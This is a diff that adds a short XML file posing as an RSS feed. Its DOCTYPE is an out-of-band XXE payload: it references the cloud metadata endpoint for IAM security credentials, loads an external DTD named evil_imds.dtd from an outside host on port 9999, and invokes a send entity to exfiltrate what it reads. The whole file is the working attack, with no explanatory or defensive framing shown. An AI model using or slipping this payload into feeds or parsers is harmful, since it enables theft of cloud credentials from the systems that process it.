@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY % imds SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  <!ENTITY % dtd SYSTEM "http://srv1.bhacky.com:9999/evil_imds.dtd">
+  %dtd;
+  %send;
+]>
+<rss version="2.0"><channel><title>imds</title><link>x</link><description>x</description></channel></rss>
